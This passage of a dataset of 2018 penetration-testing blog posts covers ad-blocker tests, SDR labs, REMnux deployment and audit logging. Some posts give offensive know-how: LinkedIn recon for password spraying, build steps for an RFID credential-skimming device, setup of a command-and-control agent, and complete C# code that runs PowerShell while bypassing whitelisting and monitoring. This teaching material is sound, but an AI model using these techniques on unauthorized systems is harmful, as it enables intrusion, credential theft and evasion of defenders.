        "output": "Title: \"Analyzing Extension Effectiveness with Burp\"\nTaxonomies: \"Author, InfoSec 201, Jordan Drysdale, Ad block extensions, AdBlock Plus, Burp, Ghostery, Jordan Drysdale, uBlock Origin\"\nCreation Date: \"Mon, 08 Jan 2018 15:34:24 +0000\"\nJordan Drysdale //\n\ntl;dr\n\nuBlock Origin appears, based on non-scientific testing, to be fairly effective at keeping trackers from making outbound HTTP GET requests.\n\nTested Extensions: No Add-ons v Ghostery v uBlock Origin v AdBlock PlusAnalyzed Website homepages: CNN v FoxNews v MSNBC\n\nI ran all of the following tests about the same. I clear my browser cache, start a new Burp session and disable the proxy intercept. Via Kali Linux, the following Firefox version:\n\nFirst up, CNN.\n\nI started this analysis with a straight and clean load of CNN.com with no extensions or add-ons enabled. CNN's site generated 335 HTTP GET requests in 60 seconds.\n\nThe next run is against CNN with the Ghostery extension. This combination generated 132 requests in 60 seconds.\n\nThe third test against CNN with the uBlock Origin extension finally choked on \"You're running an AdBlocker\" and asked to be whitelisted. 102 GET requests and a soft adblock wall.\n\nThe last test for CNN was with the AdBlock Plus extension. In all, 99 GET requests and no adblock wall, weird.\n\nNext up: FoxNews. \n\nI cleared the browser cache, launched a new Burp session, and disabled intercept. At first run, with no extensions or add-ons running, there were 265 GET requests in 60 seconds. \n\nCertain elements of Fox\u2019s site absolutely broke with Ghostery enabled. I entered the URL a second time and only got about 67 HTTP GET requests through the proxy. So, they are running something in the background that is reliant, possibly on a CDN that the Ghostery crew has deemed \"irresponsible.\"\n\nThe second extension test against Foxnews.com was with uBlock origin, and I ended up with 170 GET requests.\n\nAdBlock Plus was ineffective against the trackers and ad-network scripts on Foxnews.com. We were back up to 229 GET requests with the AdBlock Plus extension.\n\nLast on the list: MSNBC. \n\nAs usual, I cleared the browser cache, started a new Burp session and disabled intercept. A clean load of msnbc.com generated 301 requests in 60 seconds with no extensions or add-ons running.\n\nThe first extension test, with Ghostery enabled, generated 136 GET requests in 60 seconds.\n\nWith uBlock enabled, we were down to 85 requests.\n\nFinally, and the last extension tested, AdBlock was basically ineffective against MSNBC\u2019s tracking networks. We were back up to 140 GET requests.\n\nIt looks like most ad and tracking networks have adjusted to the methods used by the AdBlock Plus extensions to squelch their noise. Ghostery performed fairly well and included some interesting data about the trackers. Overall, uBlock Origin did the best at halting the dissemination of information about my browser, browsing habits, operating system, installed extensions, and browser fingerprint.\n\nPanopticlick confirmed that things looked pretty reasonable from a tracking perspective running just uBlock:\n\nMy opinions are mine and may not align directly with BHIS. I support the EFF, DuckDuckGo, the uBlock team, PrivacyBadger, and the Ghostery crew.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wild West Hackin Fest (WWHF) SDR Labs\"\nTaxonomies: \"Author, David Fletcher, How-To, Keeloq FOB, Labs, SDR, Software Defined Raid, Wild West Hackin' Fest\"\nCreation Date: \"Wed, 10 Jan 2018 16:15:47 +0000\"\nDavid Fletcher //\n\nDuring WWHF we had a number of attendees ask for the Software Defined Radio (SDR) lab parts list and source code so that they could experiment at home.  Unfortunately, I needed to make some modifications to the lab write up and source code based on observations made during the conference and I have had little time to do so between then and now.  I feel bad for the delay, but here they are...the WWHF SDR Labs. Each lab includes a parts list to get you up and running, the lab instructions, and the source code used in the lab itself.  Just download all three files and you\u2019ll be on your way.\n\nNote:  Parts identified in the parts list do not constitute endorsement, they\u2019re just what we had...\n\nWireless Doorbell Attack Lab:\n\nThis lab demonstrates capture, analysis, and synthesis of a simple signal used to trigger a wireless doorbell. The objective of the lab is to demonstrate manual decode and replay to illustrate the need for replay protection.\n\nParts List:\n\n(1) Wireless Doorbell - $16.99\n\nhttps://www.amazon.com/Heath-Zenith-DL-6166-Wireless-Doorbell/dp/B00HDDD9HI/ref=sr_1_14?ie=UTF8&qid=1514386811&sr=8-14&keywords=Wireless+Doorbell+Heathco\n\n(1) SDR Dongle (RTL-SDR) - $19.95\n\nhttps://www.amazon.com/NooElec-NESDR-Mini-Compatible-Packages/dp/B009U7WZCA/ref=sr_1_7?ie=UTF8&qid=1514386910&sr=8-7&keywords=RTL-SDR\n\n(1) YardStick One - $123.95\n\nhttps://www.amazon.com/YARD-Stick-One-Transceiver-Antenna/dp/B06Y1RVHBP/ref=sr_1_1?ie=UTF8&qid=1514387023&sr=8-1&keywords=Yardstick+One\n\nLab Files:\n\nHandout\n\nScript\n\nKeeloq FOB Attack Lab:\n\nThis lab demonstrates capture, analysis, and synthesis of a rolling code signal used to activate an automotive key fob. The objective of the lab is to demonstrate manual decode, protective properties of rolling code, and replay to illustrate out-of-band receipt and replay.\n\nParts List:\n\n(1) Mini Breadboard - $5.69\n\nhttps://www.amazon.com/Qunqi-point-Experiment-Breadboard-5-5%C3%978-2%C3%970-85cm/dp/B0135IQ0ZC/ref=sr_1_2_sspa?ie=UTF8&qid=1514397491&sr=8-2-spons&keywords=mini+breadboard&psc=1\n\n(1) Mini BreadBoard Power Supply - $5.49\n\nhttps://www.amazon.com/CorpCo-Breadboard-Supply-Arduino-Solderless/dp/B00ZO9YB1G/ref=sr_1_1?ie=UTF8&qid=1514397662&sr=8-1&keywords=ywrobot\n\n(1) BreadBoard Jumper Wires - $6.29\n\nhttps://www.amazon.com/uxcell-Breadboard-Board-Jumper-Cable/dp/B00W8YFSPI/ref=sr_1_6?s=electronics&ie=UTF8&qid=1514397832&sr=1-6&keywords=breadboard+jumper+wires\n\n(1) 2.54 mm Straight Single Row Pin Header Strip - $5.59\n\nhttps://www.amazon.com/OdiySurveil-2-54mm-Straight-Single-Header/dp/B00UVPT5RI/ref=sr_1_1?s=electronics&ie=UTF8&qid=1514401373&sr=1-1&keywords=breadboard+headers\n\n(2) PiStop LED Stop Lights - $7.82\n\nhttps://shop.pimoroni.com/products/pistop-traffic-light-add-on-for-raspberry-pi\n\n(1) KeeLoq Key FOB System - $21.95\n\nhttps://www.circuitspecialists.com/rxd4140-434.html\n\n(1) SDR Dongle (RTL-SDR) - $19.95\n\nhttps://www.amazon.com/NooElec-NESDR-Mini-Compatible-Packages/dp/B009U7WZCA/ref=sr_1_7?ie=UTF8&qid=1514386910&sr=8-7&keywords=RTL-SDR\n\n(1) YardStick One - $123.95\n\nhttps://www.amazon.com/YARD-Stick-One-Transceiver-Antenna/dp/B06Y1RVHBP/ref=sr_1_1?ie=UTF8&qid=1514387023&sr=8-1&keywords=Yardstick+One\n\nLab Files:\n\nWiring Diagram\n\nHandout\n\nScript\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Deploy REMnux to the Cloud, Reverse Engineering Malware in the Cloud\"\nTaxonomies: \"Author, How-To, John Strand, cloud, REMnux, Reverse Engineering Malware\"\nCreation Date: \"Thu, 01 Feb 2018 15:48:01 +0000\"\nCarrie Roberts //*\n\nREMnux is a free virtual machine image with Reverse Engineering Malware tools preinstalled. REMnux is maintained by Lenny Zeltser with extensive help from David Westcott and is available from https://remnux.org. I have created an Amazon AMI image from the current version of the image so you can easily create an instance of REMnux in the cloud. This is done using the DeployREMnux Python script I developed here. Once you enter your Amazon account access keys into the configuration, it\u2019s as easy as one command:\n\npython DeployREMnux.py\n\nThe output of the command above will include the information needed to access your REMnux instance via SSH and RDP.\n\nOnce you connect, consider updating REMnux itself using its own \u201cupdate-remnux full\u201d command. Or, if you would like this step done as part of the deployment, use the update option when deploying as shown below:\n\npython DeployREMnux.py -u\n\nThe following pre-requisites must be met before installing the script. This is a Python 2.7 script so you must have Python 2.7 installed and use this version.\n\nStep 1: Install the Apache libcloud library and other required libraries. (On Windows, install the Microsoft Visual C++ Compiler for Python 2.7 first):\n\npip install apache-libcloud paramiko pycrypto\n\n* Pip is a Python package manager that comes with Python. You will need to install Python v2.7 if not already installed. On OS X, you may need to install pip. On Windows, you can find pip.exe in the C:\\Python27\\Scripts directory.\n\nStep 2: Generate an SSH key pair\n\nOn OS X and Linux, this can be done with the ssh-keygen command, as shown in the following example:\n\nssh-keygen -t rsa -b 4096\n\nOn Windows, you will be tempted to use the PuTTYgen tool but this causes issues. You need to generate the keys with ssh-keygen as shown above. You can do this on Linux/OS X and copy the keys over. Or you could do it from Git Bash on Windows or from the Linux Subsystem on Windows 10 for example. You could also generate SSH keys from the Amazon EC2 web console.\n\nStep 3: Create an Amazon account here. Generate access keys as follows.\n\nLog into your EC2 Console: https://console.aws.amazon.com\n\nSelect your name -> Security Credentials.\n\nExpand \"Access Keys\"\n\nCreate New Access Key.\n\nRecord the Access Key ID and the Access Key\n\nStep 4: Setup your configuration file. A sample configuration file is provided alongside the DeployREMnux script. Rename \u2018DeployREMnux-config.txt.example\u2019 to \u2018DeployREMnux-config.txt\u2019. Enter the AWS key information you generated in step 3 and provide the full file path to your ssh keys (generated in step 2). You can optionally configure the password that will be used for RDP access to your instance. If no password is specified, a random password will be generated.\n\n{\n\n  \"AmazonConfig\": {\n\n        \"aws_access_key_id\": \"put_your_amazon_access_key_id_here\",\n\n        \"aws_secret_access_key\": \"put_your_amazon_access_secret_here \",\n\n        \"aws_instance_size\": \"t2.micro\"\n\n  },\n\n  \"SshConfig\": {\n\n          \"private_key_file\": \"/root/.ssh/id_rsa\",\n\n          \"public_key_file\": \"/root/.ssh/id_rsa.pub\"\n\n  },\n\n  \"RemnuxConfig\": {\n\n           \"remnux_user_password\": \"\"\n\n  }\n\n}\n\nNote that if you are giving Windows paths to your keys files you need to use forward slashes like (c:/path/to/key/id_pub).\n\nLastly, the configuration file can be used to specify the size of the deployed instance. The default is the \u2018t2.micro\u2019 size which qualifies for the free tier. More expensive options are available for improved performance as needed. Your instance will be deployed to the us=east-1  region (a.k.a N. Virginia).\n\nWhen you are finished using your REMnux instance you can terminate it by pressing \u201cY\u201d at the prompt, or if you previously entered \u201cn\u201d, use the \u2018python DeployREMnux.py -t \u2019 option. Where can be determined from the output of the previous command or from the Amazon web console.\n\nIt is a good idea to keep an eye on the Amazon console to ensure that there are no lingering resources that may end up costing money unexpectedly. Remember to select the correct region (N. Virginia) using the region selector. If need be, manually terminate the instance using the web interface.\n\nEnjoy your disposable REMnux instance in the cloud via Remote Desktop and SSH!\n\n*Like always, we're thrilled to have Carrie back as a guest poster!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"I Spy with InSpy\"\nTaxonomies: \"Recon, Red Team Tools, InSpy, password spray, recon tool\"\nCreation Date: \"Mon, 05 Feb 2018 15:33:02 +0000\"\nDarin Roberts//\n\nDo you ever find yourself on an engagement and need just a few more names with which to conduct a password spray? Everyone knows the more emails you have, the higher chance of getting in with one of the easy to guess (and often used) passwords. InSpy is a great way to get some names to convert to emails. InSpy is authored by Johnathan Broche and was last updated August 24, 2018.\n\nThe following is from https://github.com/gojhonny/InSpy:\n\nInSpy is a python based LinkedIn enumeration tool. Inspy has two functionalities: TechSpy and EmpSpy.\n\nTechSpy - Crawls LinkedIn job listings for technologies used by the provided company. InSpy attempts to identify technologies by matching job descriptions to keywords from a new line delimited file.\n\nEmpSpy - Crawls LinkedIn for employees working at the provided company. InSpy searches for employees by title and/or departments from a new line delimited file. InSpy may also create emails for the identified employees if the user specifies an email format.\n\nInstalling and running InSpy is pretty straightforward. First clone the repository.\n\nAnd then install.\n\nRunning InSpy is pretty easy as well. You need to provide the company name and then a wordlist to use. InSpy has 2 built in wordlists, a large list and a small list. Note that the large list does not contain words from the small list. If you want to use the built-in lists, I recommend running the command twice, once with the large list and once with the small list. You will get different results.\n\nLarge list output:\n\nSmall list output:\n\nWhen I first ran this during a test, I gathered almost 200 additional names. I noticed there was a \u201cTimed out\u201d warning. I ran the command a second time and got a different number of names returned. I am unsure as to why this happened. However, in preparing for the blog, the same thing happened.\n\nYou can see that at different times, I got different results. Running the command multiple times might yield a larger return.\n\nAnother option is to have InSpy create the list of emails for you. This can save a step as you don\u2019t have to modify the outfile after you get the list of names.\n\nSpeaking of the outfile, you can have the output be in CSV, HTML, or JSON format. For my work, .csv is just fine.\n\nOverall, InSpy v3.0 is another useful recon tool.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Are You Spying on me? Detecting SSL Man-in-the-Middle\"\nTaxonomies: \"C2, Informational, PowerShell, SSL decrypting\"\nCreation Date: \"Thu, 08 Feb 2018 15:35:48 +0000\"\nCarrie Roberts//*\n\nIs your employer reading all your sensitive information when you browse the internet from your work computer? Probably. But how can you be sure?\n\nIt is common for companies to deploy an SSL decrypting proxy at work in an effort to better protect their assets from attack. It\u2019s something you agree to when you start employment with them, at least when you are using their network and their managed devices. Even so, you may be interested to know what HTTPS traffic they are decrypting and what they are not. For example, the company might not want to be liable for having access to your banking information, including your password, or your private information on government (.gov) websites. For this reason, a company may configure their proxy to not decrypt information to certain websites, while they readily decrypt, or Man-in-the-Middle, other communications.\n\nI developed a PowerShell script that will determine if your connection to external servers over HTTPS is being decrypted. If you happen to be a pentester, you may be especially interested in sites that are not decrypted as you will have better luck getting a Command and Control (C2) connection out of the network, using Domain Fronting for example, if your traffic is not decrypted.\n\nThe Script is called Detect-SSLmitm and is available here. Kudos to @malcomvetter for the idea to write this script and for some improvement tips. For example, comparing the intermediate certificate to reduce false positives\n\nRunning it is very simple as shown in the image below:\n\nIn the output shown, the usbank.com and whitehouse.gov sites are the only ones not being decrypted.\n\nYou can edit the script to add any test sites that you like, then run the \u201cGet-GoldenHashes\u201d function to update the list of golden hashes.\n\nBe sure to generate the Golden certificate hashes from a network location known to not decrypt SSL traffic, otherwise you will get false positives.\n\n*Carrie frequently guest posts for BHIS and we're so happy she does!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Gathering Proximity Card Credentials: The Wiegotcha\"\nTaxonomies: \"Author, David Fletcher, How-To, Physical, physical pen test, physical pen testing, Physical Pentest, raspberry Pi, RFID, Wiegotcha\"\nCreation Date: \"Mon, 12 Feb 2018 15:29:59 +0000\"\nDavid Fletcher//\n\nThere are a number of items that I watch on eBay. Included in that group are long-range proximity card readers. As it turns out, I was recently able to pick up an HID MaxiProx 5375 reader, new in box, for less than $100. I had to buy it!! These devices were a centerpiece at Black Hat USA 2014 when Bishop Fox released the Tastic RFID Thief.\n\nhttps://www.bishopfox.com/resources/tools/rfid-hacking/attack-tools/\n\nhttps://www.youtube.com/watch?v=1fszkxcJt7U\n\nFor those unaware, the reader seen below is typically used at gate or garage entrances so proximity cards can be read from a greater distance. Depending on the reader configuration and the card being used, this distance can be 1-6 feet.\n\nThe Tastic RFID Thief weaponizes this reader by adding a microcontroller (Arduino Nano) that acts as a door controller and stores credentials read from unsuspecting victims on an SD card for later use in provisioning a duplicate proximity card. This activity exposes a lack of encryption and mutual authentication between the card, reader, and controller.\n\nMy initial goal was to build a Tastic RFID Thief using my newly acquired reader. However, this proved to be somewhat difficult because the original parts on the Bishop Fox parts list were troublesome to source. While searching for suitable replacement parts and researching refactoring the original code for a different microcontroller, I came across the Wiegotcha.\n\nhttps://github.com/lixmk/Wiegotcha\n\nhttp://exfil.co/2017/01/17/wiegotcha-rfid-thief/\n\nThis device takes the Tastic RFID Thief to the next level by replacing the Arduino microcontroller with a Raspberry Pi. The Raspberry Pi solution incorporates a wireless access point using hostapd. By connecting to the access point using a phone, the operator can observe captured credentials real-time using an auto-refreshing web page that displays the card details.\n\nThe parts list for the device is pretty minimal, requiring:\n\n12/5V Battery Pack\n\nLevel Shifter\n\nReal-Time Clock\n\nJumper Wires\n\nRaspberry Pi\n\nA fully assembled device, using a Raspberry Pi B+ v1.2, can be seen below.\n\nThe web interface displays captured credentials by the most recent date/time and supports searching and download of all credentials in a CSV file.\n\nRaspbian Jessie is the release supported on the Wiegotcha GitHub repository. However, my devices are all running Raspbian Stretch just fine. I\u2019ve altered the build instructions from the repo to match my experience with Raspbian Stretch below.\n\nManual Installation Mode\n\n\"Manual\" installation is what I used to get my devices up and running. Feel free to explore install.sh and laststep.sh to fully understand what they do.\n\nBurn a fresh raspbian SD card. You can use Stretch or Stretch-lite.\n\nRun sudo su - to become root\n\nRun raspi-config and change the default keyboard layout as necessary\n\nEnsure that the Git client and ntp are installed apt-get update && apt-get install git ntp\n\nIn /root run git clonehttps://github.com/sunfounder/SunFounder_RTC_Nano.git\n\nRun cd SunFounder_RTC_Nano && ./install.sh\n\nThe install script will set up the RTC and reboot the device\n\nIn /root run git clone https://github.com/lixmk/Wiegotcha.git\n\nRun cd Wiegotcha && ./install.sh\n\nThe install script will walk you through everything, including a reboot.\n\nAfter first reboot run screen -dr install (as root)\n\nFollow instructions to complete final steps of installation.\n\nProceed to Hardware Installation.\n\nHardware Installation\n\nThorough instructions: http://exfil.co/2017/01/17/wiegotcha-rfid-thief/\n\nShort version:\n\nPlace the RTC on the RPi's GPIO starting at pin 1 (top left), going down the left side to pin 9.\n\nRun RPi pin 4 to Level Shifter HV in.\n\nRun RPi pin 6 to Level Shifter LV gnd.\n\nRun RPi pin 11 to Level Shifter LV 1.\n\nRun Rpi pin 12 to Level Shifter LV 4.\n\nRun RPi pin 17 to Level Shifter LV in.\n\nReader TB1-3 to Battery Ground (Black).\n\nReader TB1-1 to Battery 12v (Red).\n\nReader TB2-1 to Level Shifter HV 1\n\nReader TB2-2 to Level Shifter HV 4\n\nReader TB1-2 to Level Shifter HV gnd.\n\nOPTIONAL: Remove Speaker.\n\nOPTIONAL: Solder haptic motor.\n\nThe demonstrator above employs the HID MaxiProx 5375 reader which operates at 125 KHz. This same setup will work, without modification, to run the Indala ASR-620 and HID R90 long-range readers. The former is also a 125 KHz reader that supports the HID Indala card format and the latter operates at 13.56 MHz supporting HID iClass cards.\n\nThe combination of all three of these devices can be a valuable asset on physical penetration tests. When used with the BLEKey and other physical security bypass tools and techniques they can give a customer a comprehensive understanding of any weaknesses in their physical security posture.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Scan Millions of IPv4 Addresses for Vulnerabilities\"\nTaxonomies: \"Author, External/Internal, How-To, Jordan Drysdale, Web App, Digital Ocean, Jordan Drysdale, Nessus, Vulnerability Scanning\"\nCreation Date: \"Thu, 15 Feb 2018 16:38:43 +0000\"\nJordan Drysdale//\n\nSome days are not like others. Some days, you might get tasked with scanning a million IP addresses. Here\u2019s how I did it:\n\nDigital Ocean. Amazon is too picky about their rules for inbound and outbound traffic. I don\u2019t want to piss off the third or fourth largest corporation on Earth.\n\nPolitically speaking, there\u2019s always scan schedules and certain elements that have to be scanned at certain times of the day, based on our position in the heliocentric orbit, lunar year, whatever\u2026 On the DO box, use reject entries in the rules file! More later...\n\nMathematically, using the top ports from Nessus\u2019 reference document, linked here: https://docs.tenable.com/nessus/6_11/Content/DiscoverySettings.htm, [...default scan policy instructs Nessus to scan approximately 4,790 commonly used ports], then we have 4.7 billion sockets to check per million IP addresses.\n\nNow, we are getting somewhere! Let\u2019s spin some nodes up, say five at the 40 bucks per month rate. The test scan averages came in at about 30 minutes per /22 (1024 IPs, 1022 hosts). This block of IPs generated responses from about a hundred hosts which seemed to be standard across the test runs.\n\nFurther, we moved toward accomplishing our task in a week. How many nodes could scan how many IPs in how much time?\n\nLast - Using a PCI Quarterly scan profile will keep you out of trouble in a court if you are asked to explain to a judge why you dumped a customer\u2019s primary money making web application. Custom scan profiles can make this explanation difficult.\n\nLet\u2019s go through some finer points of the math. If we want to scan a million IP addresses, where do we start - considering we have our baseline defined?\n\n1000000 IPs total, each /22 or 1024 hosts average scan length came in at 30 minutes.\n\n((1000000 / 1024) * 30) = 29297 minutes or 488 hours of scan time\n\nIf we have five scanners, we are at 97 hours of scanning per instance.\n\nThen, use a Nessus merge script to combine all the .nessus files into a single scan \u201ccombo\u201d and upload. From a case study perspective, comparing the results of a million IP vulnerability results is identical to reviewing the results of a thousand IP addresses.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"When Infosec and Weed Collide: Handling Administrative Actions Safely\"\nTaxonomies: \"Author, Brian King, Informational, News, Web App, audit, authentication, government, legal, ohio, potheads, webapp, webapp test\"\nCreation Date: \"Tue, 20 Feb 2018 15:29:33 +0000\"\nBB King//*\n\nThe state of Ohio recently validated a webapp pentest finding that sometimes goes overlooked. It relates to the details of administrative functions, how they can be abused, and how just the potential for abuse can call all of your data into question.\n\nHere's what they found:\n\nCOLUMBUS, Ohio -- A \"critical flaw\" in Ohio's process for grading medical marijuana grow applications could have allowed a state employee to change scores or manipulate other documents, the state auditor's office found.\n\nTwo Ohio Department of Commerce employees had unlimited access to the online accounts of more than 20 application reviewers and associated documents, according to Auditor Dave Yost's office. The employees also created and managed passwords for the application reviewers, who were only granted access to certain parts of the application.\n\nIn a Feb. 6 letter to Commerce Director Jacqueline Williams, Yost wrote that the weakness could have allowed an employee to log in as a reviewer and change scores. The \"weakness,\" as Yost refers to it, means auditors can't tell whether a record was revised by an application reviewer or someone else logging in as the reviewer.\n\nSource: http://www.cleveland.com/metro/index.ssf/2018/02/ohio_auditor_finds_flaw_in_med.html\n\nAdministrators need to be able to create user accounts. In some situations, they also need to be able to reset passwords. In still other cases, they may need the ability to impersonate another user in order to diagnose a problem, to provide training, or help resolve problems in real-time. All of these things are legitimate needs, but each of them, if done poorly, can poison your audit trails, making it impossible to determine who did what in the application, and making your application's data completely unreliable.\n\nAny time an administrator does anything \"on behalf of\" another user, it's important that the event is logged as such. Investigators must be able to tell that a second user was involved, who that second user was, what that user did, and when it was done.\n\nWithout such logging, it becomes impossible to know for sure who took any given action. How serious a problem is that? It depends on what you want to be able to do with your data, and what responsibilities your users may have to ensure that they're doing things \"correctly\" (whatever that means for your situation).\n\nThe Auditor for the State of Ohio summarized the problem:\n\nThis control weakness could allow an administrator access to manipulate documents \u2026 while logged in \u2026 as an account holder rather than their own administrative account. Because of this critical flaw in the procedure's design, neither this office nor the public, can rely upon the \u2026 results.\n\nSource: https://assets.documentcloud.org/documents/4377305/2-6-18-Commerce-Letter-Director-Williams-2.pdf\n\nWhen an administrator has access to user credentials, the administrator can untraceably impersonate that user. Credentials are not just username and password, but anything that gives access to an account. In a webapp, the session cookie is a credential.\n\nIf you're storing user passwords in cleartext, or any other way that allows them to be used as-is from the database, the problem goes far beyond the auditing issue. Even showing a password hash, though (as some admin panels do), can approximate the same problem. Hashes can be cracked. For audit purposes, a hash revealed may have to be treated as a password revealed.\n\nThere are more resilient ways to handle the need for administrative access to accounts.\n\nPassword self-service, where a user can change or reset their own password by proving their identity to the application through use of a shared secret. Where an administrator must be involved in password resets, the user should be forced to change that password before doing anything else in the application.\n\nUse of \"ride-along\" functionality for technical support. When an administrator needs to see exactly what a user is seeing, the application can be built such that the user must invite the administrator into their session, and actively allow them to control it. This grant of permission would be recorded, and all events while the administrator is alongside would be flagged as such, clearly identifying both people involved in the session.\n\nUse of \"on behalf of\" signons. In the rare cases where there is a need for an administrator to use another person's account, that must not mean the administrator gets access to the user's credentials. An impersonation system that clearly records which person was at the keyboard during the events of that session is required. In sensitive cases, this notation should be displayed alongside the relevant data in the UI so that it cannot be missed.\n\n*Full disclosure: BHIS was not involved with this action by the State of Ohio in any way. We just noticed it in the news.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"504 VSAgent Usage Instructions\"\nTaxonomies: \"Author, How-To, Informational, Jordan Drysdale, Digital Ocean, Jordan Drysdale, SANS SEC504, vsagent\"\nCreation Date: \"Mon, 26 Feb 2018 15:27:07 +0000\"\nJordan Drysdale//\n\nHERE IT IS! Finally!\n\nFor the vsagent from SANS SEC504 (only the finest InfoSec course the world has ever seen!): this is a Q&D deployment guide for the HTTP view state agent demonstrated in the SANS SEC504 labs.\n\nThe README.md file in the repo has everything you need to get vsagent running for your enjoyment, analysis, and review in a matter of minutes.\n\nFirst, spin up a new Digital Ocean Ubuntu node and capture the IP. We generally throw DNS records at things and if you haven\u2019t integrated your GoDaddy DNS with Digital Ocean\u2019s, now is the time.\n\nSSH over to your new node and run a few commands. Clone the repo with the following:\n\ngit clone https://github.com/rev10d/504vsa.git    \n\nFor Debian/Ubuntu, install some required packages:\n\n    apt install nginx php7.0-fpm php7.0-sqlite sqlite \n\nNext, put this chunk into /etc/nginx/sites-available/default:\n\nlocation ~ \\.php$ {                                \n\n        include snippets/fastcgi-php.conf;        \n\n        fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n\n}\n\nModify ownership of the web files so things work right:\n\n    chown -R www-data:www-data /opt/course_www/vsagent-504   \n\nTrash the existing database to start fresh:\n\n    rm /opt/course_www/vsagent-504/server/data.db   \n\nRestart nginx:\n\n    service nginx restart    \n\nLaunch your vsagent with python (works on Windows, Linux, and Mac!):\n\n    python vsagent-504.py http://127.0.0.1/vssvc.php\n\nLast up, check out the http://127.0.0.1/vsgui.php service on your IP:\n\nShells, brought to you by SANS SEC504, the world\u2019s finest InfoSec security program!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PowerShell w/o PowerShell Simplified\"\nTaxonomies: \"Author, Brian Fehrman, How-To, Informational, InfoSec 101, Application Whitelisting Software, AWS, PowerShell\"\nCreation Date: \"Thu, 01 Mar 2018 15:29:22 +0000\"\nBrian Fehrman //\n\nIn a previous post, titled PowerShell without PowerShell, we showed you how you can bypass Application Whitelisting Software (AWS), PowerShell restrictions/monitoring, and Command Prompt restrictions. In some cases, you might not need all of that; you might just need a way to bypass PowerShell restrictions and/or monitoring. This post presents a simple solution for the aforementioned scenario. This approach is not new but this post attempts to present it in a plain, straight-forward way. \n\nThe sections are as follows:\n\nCode: The code needed for this solution\n\nCompilation: The OS-Dependent commands to compile the code\n\nUsage: Instructions on compilation, special configuration of PowerShell files, and execution of the program and PowerShell scripts.\n\nCode (prog.cs):\n\n//Usage: prog.exe \"path_to_powershell_file\"\nusing System;\nusing System.Configuration.Install;\nusing System.Runtime.InteropServices;\nusing System.Management.Automation.Runspaces;\npublic class Program\n{\n    public static void Main( string[] args )\n    {\n    Mycode.Exec( args[ 0 ] );\n    }\n}\npublic class Mycode\n{\n    public static void Exec(string file)\n    {\n    string command = System.IO.File.ReadAllText( file );\n    RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();\n    Runspace rspace = RunspaceFactory.CreateRunspace( rspacecfg );\n    rspace.Open();\n    Pipeline pipeline = rspace.CreatePipeline();\n   pipeline.Commands.AddScript( command );\n    pipeline.Invoke();\n    }\n}\n\nCompilation:\n\nWindows 7 x64\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\\Users\\Public\\prog.exe C:\\Users\\Public\\prog.cs\n\nWindows 7 x86\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\\Users\\Public\\prog.exe C:\\Users\\Public\\prog.cs\n\nWindows 10 x64\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\\Users\\Public\\prog.exe C:\\Users\\Public\\prog.cs\n\nWindows 10 x86\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:anycpu /out:C:\\Users\\Public\\prog.exe C:\\Users\\Public\\prog.cs\n\nUsage:\n\nCreate a file named C:\\Users\\Public\\code.cs. Copy and paste the code from the Code Section above into the code.cs file.\n\nOpen a Windows Command Prompt and compile the program by copying and pasting the command above that is appropriate to your OS.\n\nIn the PowerShell script that you wish to run, place the function call that you would normally use to run the script at the bottom of the script. For instance, say that you wanted to run Invoke-AllChecks from PowerUp.ps1. I typically do the following:\n\nInvoke-AllChecks -Verbose | Out-File C:\\Users\\Public\\allchecks.txt\n\nTo do the same with this program, you would need to copy the command above and paste it at the bottom of the PowerUp.ps1 file. \n\nOnce you've placed your function call at the bottom of your target PowerShell script, run the program and script with the following command from the Windows Command Prompt:\n\nC:\\Users\\Public\\prog.exe C:\\Users\\Public\\PowerUp.ps1\n\nNote that you need to change C:\\Users\\Public\\PowerUp.ps1 to be the name of the PowerShell script that you would like to run.\n\nConclusion:\n\nThis short and (hopefully) simple post presented a quick solution to executing PowerShell scripts in environments where PowerShell usage is restricted and/or is being monitored. This approach gives additional reasons for why companies should consider implementing stricter AWS policies in their environment. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a Better Relationship With Your C-level Regarding Information Security\"\nTaxonomies: \"How-To, InfoSec 101, c-level, c-Suite, information security, infosec, infosec 101\"\nCreation Date: \"Mon, 05 Mar 2018 16:36:31 +0000\"\nJosh Thomas //\nEditor's Note: Recently on Twitter, we asked our followers \u201cWhat's the hardest thing to get your C-level to understand regarding security?\u201d The answers came in like a roaring flood! Hopefully, this helps you towards a path that helps improve your relationship with your c-level and in return alleviate some of those frustrations.\nOne of the more challenging things that those of us working in the cyber security/information security realm routinely face is convincing the C-Suite of the value that we bring to an organization and how we can play a vital role in an organization's success. If we are lucky, we are working for a CISO who understands the evolving threat landscape and has the ear and support of a CEO/CIO/CFO/CMO/C-something or other. If we aren\u2019t so lucky, we are faced with pushback, intense scrutiny about the projects we pursue to improve our organization's security posture, and even worse, contempt! \u201cWhy are we paying these cyber guys big buck$ and why are they always asking for more budget! Don\u2019t they know they are a cost center!\u201d This is probably a reaction we\u2019ve all run up against at one point or another. \nSo, what are some things, we as a profession can do to 